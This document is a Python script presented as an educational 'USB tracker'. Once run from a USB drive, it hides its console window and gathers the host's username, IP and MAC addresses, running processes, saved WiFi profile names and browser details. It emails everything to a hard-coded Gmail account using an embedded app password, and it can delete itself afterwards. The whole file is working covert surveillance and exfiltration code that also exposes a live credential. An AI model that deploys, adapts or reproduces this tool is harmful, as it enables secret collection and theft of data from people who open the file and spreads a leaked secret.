import os
import platform
import socket
import uuid
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
import getpass
import sys
import time
import json
import subprocess

# Try to import optional packages with fallbacks
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("Requests not available - some features disabled")

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("Psutil not available - process monitoring disabled")

try:
    from cryptography.fernet import Fernet
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False
    print("Cryptography not available - encryption disabled")

try:
    import ctypes
    CTYPES_AVAILABLE = True
except ImportError:
    CTYPES_AVAILABLE = False
    print("Ctypes not available - stealth mode disabled")

# ===== CONFIGURATION =====
CONFIG = {
    "email_sender": "tesingonly12@gmail.com",
    "email_password": "ksyj pmhi jaoa qjny", 
    "email_receiver": "tesingonly12@gmail.com",
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "max_retries": 3,
    "retry_delay": 5,
    "stealth_mode": True,
    "save_log": False,
    "self_destruct": False,
    "encryption_key": b"GENERATE_A_UNIQUE_KEY_HERE_AND_KEEP_SAFE",
    "monitor_processes": PSUTIL_AVAILABLE,  # Only enable if package available
    "scan_wifi": True,
    "browser_check": True
    
}

# Generate encryption key if cryptography is available
if CRYPTOGRAPHY_AVAILABLE and CONFIG["encryption_key"] == b"GENERATE_A_UNIQUE_KEY_HERE_AND_KEEP_SAFE":
    CONFIG["encryption_key"] = Fernet.generate_key()
elif not CRYPTOGRAPHY_AVAILABLE:
    CONFIG["save_log"] = False  # Disable log saving if no encryption

# ===== DEVICE INFORMATION COLLECTION =====
def get_device_info():
    """Collect information about the device"""
    device_info = {}
    
    try:
        # Basic system information
        device_info["computer_name"] = platform.node()
        device_info["username"] = getpass.getuser()
        device_info["os"] = f"{platform.system()} {platform.release()}"
        device_info["platform"] = platform.platform()
        
        # MAC address
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) 
                        for i in range(0, 8*6, 8)][::-1])
        device_info["mac_address"] = mac
        
        # Network information
        if REQUESTS_AVAILABLE:
            try:
                device_info["public_ip"] = requests.get('https://api.ipify.org', timeout=10).text
            except:
                device_info["public_ip"] = "Unable to retrieve"
        else:
            device_info["public_ip"] = "Requests package not available"
            
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            device_info["local_ip"] = s.getsockname()[0]
            s.close()
        except:
            device_info["local_ip"] = "Unable to retrieve"
        
        # Additional details
        device_info["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        device_info["current_directory"] = os.getcwd()
        
        # Enhanced data collection based on config and availability
        if CONFIG["monitor_processes"] and PSUTIL_AVAILABLE:
            device_info["running_processes"] = monitor_file_operations()
        elif CONFIG["monitor_processes"]:
            device_info["running_processes"] = "Psutil package not available"
            
        if CONFIG["scan_wifi"]:
            device_info["wifi_networks"] = scan_wifi_networks()
            
        if CONFIG["browser_check"]:
            device_info["browser_info"] = get_browser_info()
        
    except Exception as e:
        device_info["error"] = f"Failed to collect device info: {str(e)}"
    
    return device_info

# ===== FEATURE 2: FILE OPERATIONS TRACKING =====
def monitor_file_operations():
    """Track running processes and file operations"""
    if not PSUTIL_AVAILABLE:
        return "Process monitoring unavailable - install psutil package"
    
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent']):
            try:
                process_info = {
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'username': proc.info['username'],
                    'memory_mb': round(proc.info['memory_info'].rss / 1024 / 1024, 2) if proc.info['memory_info'] else 0,
                    'cpu_percent': round(proc.info['cpu_percent'], 2) if proc.info['cpu_percent'] else 0
                }
                processes.append(process_info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
                
        # Sort by memory usage (most intensive first)
        processes.sort(key=lambda x: x['memory_mb'], reverse=True)
        return processes[:20]  # Return top 20 memory-consuming processes
        
    except Exception as e:
        return f"Error monitoring processes: {str(e)}"

# ===== FEATURE 4: WIFI NETWORK SCANNER =====
def scan_wifi_networks():
    """Scan available WiFi networks and saved profiles"""
    wifi_info = {}
    
    try:
        if platform.system() == "Windows":
            # Get saved WiFi profiles
            try:
                profiles_output = subprocess.check_output(
                    ["netsh", "wlan", "show", "profiles"], 
                    universal_newlines=True,
                    stderr=subprocess.DEVNULL
                )
                
                profile_names = []
                for line in profiles_output.split('\n'):
                    if "All User Profile" in line:
                        profile_name = line.split(":")[1].strip()
                        profile_names.append(profile_name)
                
                wifi_info["saved_profiles"] = profile_names
                
            except subprocess.CalledProcessError:
                wifi_info["saved_profiles"] = "Unable to retrieve"
                
            # Get current connected network
            try:
                current_output = subprocess.check_output(
                    ["netsh", "wlan", "show", "interfaces"],
                    universal_newlines=True,
                    stderr=subprocess.DEVNULL
                )
                
                for line in current_output.split('\n'):
                    if "SSID" in line and "BSSID" not in line:
                        wifi_info["current_ssid"] = line.split(":")[1].strip()
                        break
                        
            except subprocess.CalledProcessError:
                wifi_info["current_ssid"] = "Unable to retrieve"
                
        else:
            wifi_info["info"] = "WiFi scanning currently supported on Windows only"
            
    except Exception as e:
        wifi_info["error"] = f"WiFi scan failed: {str(e)}"
    
    return wifi_info

# ===== FEATURE 5: BROWSER INFORMATION EXTRACTION =====
def get_browser_info():
    """Check for installed browsers and basic information"""
    browser_info = {}
    
    try:
        # Common browser installation paths
        browsers = {
            "chrome": [
                os.path.expanduser("~\\AppData\\Local\\Google\\Chrome"),
                os.path.expanduser("~/.config/google-chrome"),
                "C:\\Program Files\\Google\\Chrome"
            ],
            "firefox": [
                os.path.expanduser("~\\AppData\\Local\\Mozilla\\Firefox"),
                os.path.expanduser("~/.mozilla/firefox"),
                "C:\\Program Files\\Mozilla Firefox"
            ],
            "edge": [
                os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge"),
                "C:\\Program Files (x86)\\Microsoft\\Edge"
            ],
            "opera": [
                os.path.expanduser("~\\AppData\\Local\\Opera Software"),
                os.path.expanduser("~/.config/opera"),
                "C:\\Program Files\\Opera"
            ]
        }
        
        installed_browsers = []
        for browser, paths in browsers.items():
            for path in paths:
                if os.path.exists(path):
                    installed_browsers.append(browser)
                    break
        
        browser_info["installed_browsers"] = installed_browsers
        browser_info["default_browser"] = get_default_browser()
        
    except Exception as e:
        browser_info["error"] = f"Browser check failed: {str(e)}"
    
    return browser_info

def get_default_browser():
    """Get the default browser on the system"""
    try:
        if platform.system() == "Windows":
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                              r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice") as key:
                return winreg.QueryValueEx(key, "Progid")[0]
        else:
            return "Default browser detection not implemented for this OS"
    except:
        return "Unable to determine default browser"

# ===== FEATURE 6: ENCRYPTED DATA STORAGE =====
def encrypt_data(data):
    """Encrypt the collected data"""
    if not CRYPTOGRAPHY_AVAILABLE:
        return None
        
    try:
        fernet = Fernet(CONFIG["encryption_key"])
        encrypted_data = fernet.encrypt(json.dumps(data).encode())
        return encrypted_data
    except Exception as e:
        print(f"Encryption error: {e}")
        return None

def decrypt_data(encrypted_data):
    """Decrypt the data"""
    if not CRYPTOGRAPHY_AVAILABLE:
        return None
        
    try:
        fernet = Fernet(CONFIG["encryption_key"])
        decrypted_data = fernet.decrypt(encrypted_data)
        return json.loads(decrypted_data.decode())
    except Exception as e:
        print(f"Decryption error: {e}")
        return None

def save_local_log(device_info):
    """Save encrypted log locally"""
    if not CRYPTOGRAPHY_AVAILABLE:
        return None
        
    try:
        encrypted_data = encrypt_data(device_info)
        if encrypted_data:
            log_filename = f"system_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.enc"
            with open(log_filename, 'wb') as f:
                f.write(encrypted_data)
            return log_filename
    except Exception as e:
        print(f"Log save error: {e}")
    return None

# ===== FEATURE 8: STEALTH ENHANCEMENTS =====
def hide_console():
    """Hide console window on Windows"""
    if not CTYPES_AVAILABLE:
        return
        
    try:
        if platform.system() == "Windows" and CONFIG["stealth_mode"]:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception as e:
        pass  # Silently fail if hiding doesn't work

# ===== EMAIL NOTIFICATION =====
def send_alert(device_info):
    """Send an email alert with the collected device information"""
    
    # Format the enhanced information
    processes_text = ""
    if "running_processes" in device_info and device_info["running_processes"]:
        if isinstance(device_info["running_processes"], list):
            processes_text = "\n".join([
                f"  - {p['name']} (PID: {p['pid']}, Memory: {p['memory_mb']}MB)" 
                for p in device_info["running_processes"][:5]  # Show top 5
            ])
        else:
            processes_text = device_info["running_processes"]
    
    wifi_text = ""
    if "wifi_networks" in device_info:
        wifi = device_info["wifi_networks"]
        if "saved_profiles" in wifi and isinstance(wifi["saved_profiles"], list):
            wifi_text = f"Saved networks: {', '.join(wifi['saved_profiles'][:5])}"
        if "current_ssid" in wifi:
            wifi_text += f"\nCurrent: {wifi['current_ssid']}"
    
    browser_text = ""
    if "browser_info" in device_info:
        browser = device_info["browser_info"]
        if "installed_browsers" in browser:
            browser_text = f"Installed: {', '.join(browser['installed_browsers'])}"
        if "default_browser" in browser:
            browser_text += f"\nDefault: {browser['default_browser']}"
    
    message = f"""
    🔍 USB Device Opened - Enhanced Security Alert 🔍
    
    Someone has opened a file on your USB device.
    
    SYSTEM INFORMATION:
    - Computer Name: {device_info.get('computer_name', 'N/A')}
    - Username: {device_info.get('username', 'N/A')}
    - Operating System: {device_info.get('os', 'N/A')}
    
    NETWORK INFORMATION:
    - Public IP: {device_info.get('public_ip', 'N/A')}
    - Local IP: {device_info.get('local_ip', 'N/A')}
    - MAC Address: {device_info.get('mac_address', 'N/A')}
    
    ENHANCED DATA:
    - Top Processes:
    {processes_text}
    
    - WiFi Information:
    {wifi_text}
    
    - Browser Information:
    {browser_text}
    
    TIME: {device_info.get('timestamp', 'N/A')}
    USB Location: {device_info.get('current_directory', 'N/A')}
    
    This is an educational project for IT security studies.
    """
    
    msg = MIMEText(message)
    msg['Subject'] = "🚨 ENHANCED USB Alert - System Information Collected"
    msg['From'] = CONFIG['email_sender']
    msg['To'] = CONFIG['email_receiver']
    
    for attempt in range(CONFIG['max_retries']):
        try:
            with smtplib.SMTP(CONFIG['smtp_server'], CONFIG['smtp_port']) as server:
                server.starttls()
                server.login(CONFIG['email_sender'], CONFIG['email_password'])
                server.sendmail(CONFIG['email_sender'], 
                              [CONFIG['email_receiver']], 
                              msg.as_string())
            return True
        except Exception as e:
            if attempt < CONFIG['max_retries'] - 1:
                time.sleep(CONFIG['retry_delay'])
            else:
                return False
    return False

# ===== MAIN EXECUTION =====
def main():
    """Main function that runs the enhanced tracker"""
    try:
        # Apply stealth mode
        hide_console()
        
        # Collect enhanced device information
        device_info = get_device_info()
        
        # Save encrypted local log (if encryption available)
        log_file = save_local_log(device_info)
        if log_file:
            device_info["local_log_file"] = log_file
        
        # Try to send alert
        success = send_alert(device_info)
        
        # Self-destruct if configured
        if CONFIG["self_destruct"]:
            try:
                os.remove(sys.argv[0])  # Delete this script
                if log_file and os.path.exists(log_file):
                    os.remove(log_file)  # Also delete the log file
            except:
                pass
                
        return success
        
    except Exception as e:
        return False

if __name__ == "__main__":
    # Run the enhanced tracker
    main()
    
    # Exit immediately
    sys.exit(0)